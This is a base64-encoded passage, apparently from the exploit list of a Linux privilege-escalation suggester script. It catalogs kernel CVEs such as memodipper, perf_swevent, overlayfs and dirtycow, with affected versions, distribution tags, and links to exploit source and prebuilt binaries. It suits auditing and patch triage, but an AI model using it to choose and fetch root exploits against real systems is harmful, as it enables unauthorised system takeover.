Zz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMzAsdmVyPDIuNi4zNwpUYWdzOiBkZWJpYW49Ni4we2tlcm5lbDoyLjYuKDMxfDMyfDM0fDM1KS0oMXx0cnVuayktYW1kNjR9LHVidW50dT0xMC4xMHw5LjEwLGZlZG9yYT0xM3trZXJuZWw6Mi42LjMzLjMtODUuZmMxMy5pNjg2LlBBRX0sdWJ1bnR1PTEwLjA0e2tlcm5lbDoyLjYuMzItKDIxfDI0KS1nZW5lcmljfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3d3dy5zZWN1cml0eWZvY3VzLmNvbS9hcmNoaXZlLzEvNTE0Mzc5CnNyYy11cmw6IGh0dHA6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTAxMDIwMDQ0MDQ4L2h0dHA6Ly93d3cudnNlY3VyaXR5LmNvbS9kb3dubG9hZC90b29scy9saW51eC1yZHMtZXhwbG9pdC5jCmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDE2MDYwMjE5MjY0MS9odHRwczovL3d3dy5rZXJuZWwtZXhwbG9pdHMuY29tL21lZGlhL3JkcwpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2NDEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS9yZHM2NApleHBsb2l0LWRiOiAxNTI4NQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEwLTM4NDgsQ1ZFLTIwMTAtMzg1MCxDVkUtMjAxMC00MDczXSR7dHh0cnN0fSBoYWxmX25lbHNvbgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMzYKVGFnczogdWJ1bnR1PSgxMC4wNHw5LjEwKXtrZXJuZWw6Mi42LigzMXwzMiktKDE0fDIxKS1zZXJ2ZXJ9ClJhbms6IDEKYmluLXVybDogaHR0cDovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2MzEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS9oYWxmLW5lbHNvbjMKZXhwbG9pdC1kYjogMTc3ODcKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtOL0FdJHt0eHRyc3R9IGNhcHNfdG9fcm9vdApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjM0LHZlcjw9Mi42LjM2LHg4NgpUYWdzOiB1YnVudHU9MTAuMTAKUmFuazogMQpleHBsb2l0LWRiOiAxNTkxNgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W04vQV0ke3R4dHJzdH0gY2Fwc190b19yb290IDIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4zNCx2ZXI8PTIuNi4zNgpUYWdzOiB1YnVudHU9MTAuMTAKUmFuazogMQpleHBsb2l0LWRiOiAxNTk0NApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEwLTQzNDddJHt0eHRyc3R9IGFtZXJpY2FuLXNpZ24tbGFuZ3VhZ2UKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4wLHZlcjw9Mi42LjM2ClRhZ3M6ClJhbms6IDEKZXhwbG9pdC1kYjogMTU3NzQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMC0zNDM3XSR7dHh0cnN0fSBwa3RjZHZkClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4zNgpUYWdzOiB1YnVudHU9MTAuMDQKUmFuazogMQpleHBsb2l0LWRiOiAxNTE1MApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEwLTMwODFdJHt0eHRyc3R9IHZpZGVvNGxpbnV4ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMCx2ZXI8PTIuNi4zMwpUYWdzOiBSSEVMPTUKUmFuazogMQpleHBsb2l0LWRiOiAxNTAyNApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEyLTAwNTZdJHt0eHRyc3R9IG1lbW9kaXBwZXIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMC4wLHZlcjw9My4xLjAKVGFnczogdWJ1bnR1PSgxMC4wNHwxMS4xMCl7a2VybmVsOjMuMC4wLTEyLShnZW5lcmljfHNlcnZlcil9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdC56eDJjNC5jb20vQ1ZFLTIwMTItMDA1Ni9hYm91dC8Kc3JjLXVybDogaHR0cHM6Ly9naXQuengyYzQuY29tL0NWRS0yMDEyLTAwNTYvcGxhaW4vbWVtcG9kaXBwZXIuYwpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2MzEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS9tZW1vZGlwcGVyCmJpbi11cmw6IGh0dHBzOi8vd2ViLmFyY2hpdmUub3JnL3dlYi8yMDE2MDYwMjE5MjYzMS9odHRwczovL3d3dy5rZXJuZWwtZXhwbG9pdHMuY29tL21lZGlhL21lbW9kaXBwZXI2NApleHBsb2l0LWRiOiAxODQxMQpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEyLTAwNTYsQ1ZFLTIwMTAtMzg0OSxDVkUtMjAxMC0zODUwXSR7dHh0cnN0fSBmdWxsLW5lbHNvbgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjAsdmVyPD0yLjYuMzYKVGFnczogdWJ1bnR1PSg5LjEwfDEwLjEwKXtrZXJuZWw6Mi42LigzMXwzNSktKDE0fDE5KS0oc2VydmVyfGdlbmVyaWMpfSx1YnVudHU9MTAuMDR7a2VybmVsOjIuNi4zMi0oMjF8MjQpLXNlcnZlcn0KUmFuazogMQpzcmMtdXJsOiBodHRwOi8vdnVsbmZhY3Rvcnkub3JnL2V4cGxvaXRzL2Z1bGwtbmVsc29uLmMKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvZnVsbC1uZWxzb24KYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvZnVsbC1uZWxzb242NApleHBsb2l0LWRiOiAxNTcwNApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDEzLTE4NThdJHt0eHRyc3R9IENMT05FX05FV1VTRVJ8Q0xPTkVfRlMKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI9My44LENPTkZJR19VU0VSX05TPXkKVGFnczogClJhbms6IDEKc3JjLXVybDogaHR0cDovL3N0ZWFsdGgub3BlbndhbGwubmV0L3hTcG9ydHMvY2xvd24tbmV3dXNlci5jCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzU0MzI3My8KZXhwbG9pdC1kYjogMzgzOTAKYXV0aG9yOiBTZWJhc3RpYW4gS3JhaG1lcgpDb21tZW50czogQ09ORklHX1VTRVJfTlMgbmVlZHMgdG8gYmUgZW5hYmxlZCAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMy0yMDk0XSR7dHh0cnN0fSBwZXJmX3N3ZXZlbnQKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4zMix2ZXI8My44LjkseDg2XzY0ClRhZ3M6IFJIRUw9Nix1YnVudHU9MTIuMDR7a2VybmVsOjMuMi4wLSgyM3wyOSktZ2VuZXJpY30sZmVkb3JhPTE2e2tlcm5lbDozLjEuMC03LmZjMTYueDg2XzY0fSxmZWRvcmE9MTd7a2VybmVsOjMuMy40LTUuZmMxNy54ODZfNjR9LGRlYmlhbj03e2tlcm5lbDozLjIuMC00LWFtZDY0fQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3RpbWV0b2JsZWVkLmNvbS9hLWNsb3Nlci1sb29rLWF0LWEtcmVjZW50LXByaXZpbGVnZS1lc2NhbGF0aW9uLWJ1Zy1pbi1saW51eC1jdmUtMjAxMy0yMDk0LwpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2MzEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS9wZXJmX3N3ZXZlbnQKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvcGVyZl9zd2V2ZW50NjQKZXhwbG9pdC1kYjogMjYxMzEKYXV0aG9yOiBBbmRyZWEgJ3NvcmJvJyBCaXR0YXUKQ29tbWVudHM6IE5vIFNNRVAvU01BUCBieXBhc3MKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMy0yMDk0XSR7dHh0cnN0fSBwZXJmX3N3ZXZlbnQgMgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjMyLHZlcjwzLjguOSx4ODZfNjQKVGFnczogdWJ1bnR1PTEyLjA0e2tlcm5lbDozLigyfDUpLjAtKDIzfDI5KS1nZW5lcmljfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL3RpbWV0b2JsZWVkLmNvbS9hLWNsb3Nlci1sb29rLWF0LWEtcmVjZW50LXByaXZpbGVnZS1lc2NhbGF0aW9uLWJ1Zy1pbi1saW51eC1jdmUtMjAxMy0yMDk0LwpzcmMtdXJsOiBodHRwczovL2N5c2VjbGFicy5jb20vZXhwbG9pdHMvdm5pa192MS5jCmV4cGxvaXQtZGI6IDMzNTg5CmF1dGhvcjogVml0YWx5ICd2bmlrJyBOaWtvbGVua28KQ29tbWVudHM6IE5vIFNNRVAvU01BUCBieXBhc3MKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMy0wMjY4XSR7dHh0cnN0fSBtc3IKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4xOCx2ZXI8My43LjYKVGFnczogClJhbms6IDEKZXhwbG9pdC1kYjogMjcyOTcKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMy0xOTU5XSR7dHh0cnN0fSB1c2VybnNfcm9vdF9zcGxvaXQKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMC4xLHZlcjwzLjguOQpUYWdzOiAKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly93d3cub3BlbndhbGwuY29tL2xpc3RzL29zcy1zZWN1cml0eS8yMDEzLzA0LzI5LzEKZXhwbG9pdC1kYjogMjU0NTAKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxMy0yMDk0XSR7dHh0cnN0fSBzZW10ZXgKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTIuNi4zMix2ZXI8My44LjkKVGFnczogUkhFTD02ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vdGltZXRvYmxlZWQuY29tL2EtY2xvc2VyLWxvb2stYXQtYS1yZWNlbnQtcHJpdmlsZWdlLWVzY2FsYXRpb24tYnVnLWluLWxpbnV4LWN2ZS0yMDEzLTIwOTQvCmV4cGxvaXQtZGI6IDI1NDQ0CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTQtMDAzOF0ke3R4dHJzdH0gdGltZW91dHB3bgpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My40LjAsdmVyPD0zLjEzLjEsQ09ORklHX1g4Nl9YMzI9eQpUYWdzOiB1YnVudHU9MTMuMTAKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9ibG9nLmluY2x1ZGVzZWN1cml0eS5jb20vMjAxNC8wMy9leHBsb2l0LUNWRS0yMDE0LTAwMzgteDMyLXJlY3ZtbXNnLWtlcm5lbC12dWxuZXJhYmxpdHkuaHRtbApiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2MzEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS90aW1lb3V0cHduNjQKZXhwbG9pdC1kYjogMzEzNDYKQ29tbWVudHM6IENPTkZJR19YODZfWDMyIG5lZWRzIHRvIGJlIGVuYWJsZWQKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNC0wMDM4XSR7dHh0cnN0fSB0aW1lb3V0cHduIDIKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuNC4wLHZlcjw9My4xMy4xLENPTkZJR19YODZfWDMyPXkKVGFnczogdWJ1bnR1PSgxMy4wNHwxMy4xMCl7a2VybmVsOjMuKDh8MTEpLjAtKDEyfDE1fDE5KS1nZW5lcmljfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cDovL2Jsb2cuaW5jbHVkZXNlY3VyaXR5LmNvbS8yMDE0LzAzL2V4cGxvaXQtQ1ZFLTIwMTQtMDAzOC14MzItcmVjdm1tc2cta2VybmVsLXZ1bG5lcmFibGl0eS5odG1sCmV4cGxvaXQtZGI6IDMxMzQ3CkNvbW1lbnRzOiBDT05GSUdfWDg2X1gzMiBuZWVkcyB0byBiZSBlbmFibGVkCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTQtMDE5Nl0ke3R4dHJzdH0gcmF3bW9kZVBUWQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49Mi42LjMxLHZlcjw9My4xNC4zClRhZ3M6ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vYmxvZy5pbmNsdWRlc2VjdXJpdHkuY29tLzIwMTQvMDYvZXhwbG9pdC13YWxrdGhyb3VnaC1jdmUtMjAxNC0wMTk2LXB0eS1rZXJuZWwtcmFjZS1jb25kaXRpb24uaHRtbApleHBsb2l0LWRiOiAzMzUxNgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE0LTI4NTFdJHt0eHRyc3R9IHVzZS1hZnRlci1mcmVlIGluIHBpbmdfaW5pdF9zb2NrKCkgJHtibGRibHV9KERvUykke3R4dHJzdH0KUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMC4xLHZlcjw9My4xNApUYWdzOiAKUmFuazogMAphbmFseXNpcy11cmw6IGh0dHBzOi8vY3lzZWNsYWJzLmNvbS9wYWdlP249MDIwMTIwMTYKZXhwbG9pdC1kYjogMzI5MjYKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNC00MDE0XSR7dHh0cnN0fSBpbm9kZV9jYXBhYmxlClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMSx2ZXI8PTMuMTMKVGFnczogdWJ1bnR1PTEyLjA0ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNC8wNi8xMC80CmV4cGxvaXQtZGI6IDMzODI0CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTQtNDY5OV0ke3R4dHJzdH0gcHRyYWNlL3N5c3JldApSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49My4wLjEsdmVyPD0zLjgKVGFnczogdWJ1bnR1PTEyLjA0ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNC8wNy8wOC8xNgpleHBsb2l0LWRiOiAzNDEzNApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE0LTQ5NDNdJHt0eHRyc3R9IFBQUG9MMlRQICR7YmxkYmx1fShEb1MpJHt0eHRyc3R9ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjIsdmVyPD0zLjE1LjYKVGFnczogClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwczovL2N5c2VjbGFicy5jb20vcGFnZT9uPTAxMTAyMDE1CmV4cGxvaXQtZGI6IDM2MjY3CkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTQtNTIwN10ke3R4dHJzdH0gZnVzZV9zdWlkClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMSx2ZXI8PTMuMTYuMQpUYWdzOiAKUmFuazogMQpleHBsb2l0LWRiOiAzNDkyMwpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTkzMjJdJHt0eHRyc3R9IEJhZElSRVQKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMC4xLHZlcjwzLjE3LjUseDg2XzY0ClRhZ3M6IFJIRUw8PTcsZmVkb3JhPTIwClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vbGFicy5icm9taXVtLmNvbS8yMDE1LzAyLzAyL2V4cGxvaXRpbmctYmFkaXJldC12dWxuZXJhYmlsaXR5LWN2ZS0yMDE0LTkzMjItbGludXgta2VybmVsLXByaXZpbGVnZS1lc2NhbGF0aW9uLwpzcmMtdXJsOiBodHRwOi8vc2l0ZS5waTMuY29tLnBsL2V4cC9wX2N2ZS0yMDE0LTkzMjIudGFyLmd6CmV4cGxvaXQtZGI6CmF1dGhvcjogUmFmYWwgJ24zcmdhbCcgV29qdGN6dWsgJiBBZGFtICdwaTMnIFphYnJvY2tpCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtMzI5MF0ke3R4dHJzdH0gZXNwZml4NjRfTk1JClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjEzLHZlcjw0LjEuNix4ODZfNjQKVGFnczogClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3Lm9wZW53YWxsLmNvbS9saXN0cy9vc3Mtc2VjdXJpdHkvMjAxNS8wOC8wNC84CmV4cGxvaXQtZGI6IDM3NzIyCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bTi9BXSR7dHh0cnN0fSBibHVldG9vdGgKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI8PTIuNi4xMQpUYWdzOgpSYW5rOiAxCmV4cGxvaXQtZGI6IDQ3NTYKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNS0xMzI4XSR7dHh0cnN0fSBvdmVybGF5ZnMKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMTMuMCx2ZXI8PTMuMTkuMApUYWdzOiB1YnVudHU9KDEyLjA0fDE0LjA0KXtrZXJuZWw6My4xMy4wLSgyfDN8NHw1KSotZ2VuZXJpY30sdWJ1bnR1PSgxNC4xMHwxNS4wNCl7a2VybmVsOjMuKDEzfDE2KS4wLSotZ2VuZXJpY30KUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly9zZWNsaXN0cy5vcmcvb3NzLXNlYy8yMDE1L3EyLzcxNwpiaW4tdXJsOiBodHRwczovL3dlYi5hcmNoaXZlLm9yZy93ZWIvMjAxNjA2MDIxOTI2MzEvaHR0cHM6Ly93d3cua2VybmVsLWV4cGxvaXRzLmNvbS9tZWRpYS9vZnNfMzIKYmluLXVybDogaHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTYwNjAyMTkyNjMxL2h0dHBzOi8vd3d3Lmtlcm5lbC1leHBsb2l0cy5jb20vbWVkaWEvb2ZzXzY0CmV4cGxvaXQtZGI6IDM3MjkyCkVPRgopCgpFWFBMT0lUU1soKG4rKykpXT0kKGNhdCA8PEVPRgpOYW1lOiAke3R4dGdybn1bQ1ZFLTIwMTUtODY2MF0ke3R4dHJzdH0gb3ZlcmxheWZzIChvdmxfc2V0YXR0cikKUmVxczogcGtnPWxpbnV4LWtlcm5lbCx2ZXI+PTMuMC4wLHZlcjw9NC4zLjMKVGFnczoKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHA6Ly93d3cuaGFsZmRvZy5uZXQvU2VjdXJpdHkvMjAxNS9Vc2VyTmFtZXNwYWNlT3ZlcmxheWZzU2V0dWlkV3JpdGVFeGVjLwpleHBsb2l0LWRiOiAzOTIzMApFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE1LTg2NjBdJHt0eHRyc3R9IG92ZXJsYXlmcyAob3ZsX3NldGF0dHIpClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMCx2ZXI8PTQuMy4zClRhZ3M6IHVidW50dT0oMTQuMDR8MTUuMTApe2tlcm5lbDo0LjIuMC0oMTh8MTl8MjB8MjF8MjIpLWdlbmVyaWN9ClJhbms6IDEKYW5hbHlzaXMtdXJsOiBodHRwOi8vd3d3LmhhbGZkb2cubmV0L1NlY3VyaXR5LzIwMTUvVXNlck5hbWVzcGFjZU92ZXJsYXlmc1NldHVpZFdyaXRlRXhlYy8KZXhwbG9pdC1kYjogMzkxNjYKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi0wNzI4XSR7dHh0cnN0fSBrZXlyaW5nClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjEwLHZlcjw0LjQuMQpUYWdzOgpSYW5rOiAwCmFuYWx5c2lzLXVybDogaHR0cDovL3BlcmNlcHRpb24tcG9pbnQuaW8vMjAxNi8wMS8xNC9hbmFseXNpcy1hbmQtZXhwbG9pdGF0aW9uLW9mLWEtbGludXgta2VybmVsLXZ1bG5lcmFiaWxpdHktY3ZlLTIwMTYtMDcyOC8KZXhwbG9pdC1kYjogNDAwMDMKQ29tbWVudHM6IEV4cGxvaXQgdGFrZXMgYWJvdXQgfjMwIG1pbnV0ZXMgdG8gcnVuLiBFeHBsb2l0IGlzIG5vdCByZWxpYWJsZSwgc2VlOiBodHRwczovL2N5c2VjbGFicy5jb20vYmxvZy9jdmUtMjAxNi0wNzI4LXBvYy1ub3Qtd29ya2luZwpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTIzODRdJHt0eHRyc3R9IHVzYi1taWRpClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0zLjAuMCx2ZXI8PTQuNC44ClRhZ3M6IHVidW50dT0xNC4wNCxmZWRvcmE9MjIKUmFuazogMQphbmFseXNpcy11cmw6IGh0dHBzOi8veGFpcnkuZ2l0aHViLmlvL2Jsb2cvMjAxNi9jdmUtMjAxNi0yMzg0CnNyYy11cmw6IGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94YWlyeS9rZXJuZWwtZXhwbG9pdHMvbWFzdGVyL0NWRS0yMDE2LTIzODQvcG9jLmMKZXhwbG9pdC1kYjogNDE5OTkKQ29tbWVudHM6IFJlcXVpcmVzIGFiaWxpdHkgdG8gcGx1ZyBpbiBhIG1hbGljaW91cyBVU0IgZGV2aWNlIGFuZCB0byBleGVjdXRlIGEgbWFsaWNpb3VzIGJpbmFyeSBhcyBhIG5vbi1wcml2aWxlZ2VkIHVzZXIKYXV0aG9yOiBBbmRyZXkgJ3hhaXJ5JyBLb25vdmFsb3YKRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi00OTk3XSR7dHh0cnN0fSB0YXJnZXRfb2Zmc2V0ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj00LjQuMCx2ZXI8PTQuNC4wLGNtZDpncmVwIC1xaSBpcF90YWJsZXMgL3Byb2MvbW9kdWxlcwpUYWdzOiB1YnVudHU9MTYuMDR7a2VybmVsOjQuNC4wLTIxLWdlbmVyaWN9ClJhbms6IDEKc3JjLXVybDogaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvYmluLXNwbG9pdHMvNDAwNTMuemlwCkNvbW1lbnRzOiBpcF90YWJsZXMua28gbmVlZHMgdG8gYmUgbG9hZGVkCmV4cGxvaXQtZGI6IDQwMDQ5CmF1dGhvcjogVml0YWx5ICd2bmlrJyBOaWtvbGVua28KRU9GCikKCkVYUExPSVRTWygobisrKSldPSQoY2F0IDw8RU9GCk5hbWU6ICR7dHh0Z3JufVtDVkUtMjAxNi00NTU3XSR7dHh0cnN0fSBkb3VibGUtZmRwdXQoKQpSZXFzOiBwa2c9bGludXgta2VybmVsLHZlcj49NC40LHZlcjw0LjUuNSxDT05GSUdfQlBGX1NZU0NBTEw9eSxzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF9icGZfZGlzYWJsZWQhPTEKVGFnczogdWJ1bnR1PTE2LjA0e2tlcm5lbDo0LjQuMC0yMS1nZW5lcmljfQpSYW5rOiAxCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9idWdzLmNocm9taXVtLm9yZy9wL3Byb2plY3QtemVyby9pc3N1ZXMvZGV0YWlsP2lkPTgwOApzcmMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UtYmluLXNwbG9pdHMvcmF3L21hc3Rlci9iaW4tc3Bsb2l0cy8zOTc3Mi56aXAKQ29tbWVudHM6IENPTkZJR19CUEZfU1lTQ0FMTCBuZWVkcyB0byBiZSBzZXQgJiYga2VybmVsLnVucHJpdmlsZWdlZF9icGZfZGlzYWJsZWQgIT0gMQpleHBsb2l0LWRiOiA0MDc1OQphdXRob3I6IEphbm4gSG9ybgpFT0YKKQoKRVhQTE9JVFNbKChuKyspKV09JChjYXQgPDxFT0YKTmFtZTogJHt0eHRncm59W0NWRS0yMDE2LTUxOTVdJHt0eHRyc3R9IGRpcnR5Y293ClJlcXM6IHBrZz1saW51eC1rZXJuZWwsdmVyPj0yLjYuMjIsdmVyPD00LjguMwpUYWdzOiBkZWJpYW49N3w4LFJIRUw9NXtrZXJuZWw6Mi42LigxOHwyNHwzMyktKn0sUkhFTD02e2tlcm5lbDoyLjYuMzItKnwzLigwfDJ8Nnw4fDEwKS4qfDIuNi4zMy45LXJ0MzF9LFJIRUw9N3trZXJuZWw6My4xMC4wLSp8NC4yLjAtMC4yMS5lbDd9LHVidW50dT0xNi4wNHwxNC4wNHwxMi4wNApSYW5rOiA0CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL2RpcnR5Y293L2RpcnR5Y293LmdpdGh1Yi5pby93aWtpL1Z1bG5lcmFiaWxpdHlEZXRhaWxzCkNvbW1lbnRzOiBGb3IgUkhFTC9DZW50T1Mgc2VlIGV4YWN0IHZ1bG5lcmFibGUgdmVyc2lvbnMgaGVyZTogaHR0cHM6Ly9hY2Nlc3MucmVkaGF0LmNvbS9zaXRlcy9kZWZhdWx0L2ZpbGVzL3JoLWN2ZS0yMDE2LTUxOTVfNS5zaApleHBsb2l0LWRiOiA0